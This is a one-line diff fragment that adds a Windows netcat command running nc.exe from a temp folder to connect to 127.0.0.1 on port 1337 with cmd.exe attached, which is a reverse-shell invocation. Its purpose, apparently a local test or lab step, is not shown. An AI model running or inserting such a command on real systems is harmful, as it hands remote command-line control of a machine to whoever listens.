@@ -1,0 +1,1 @@
+C:\temp\nc\nc.exe 127.0.0.1 1337 -e cmd.exe
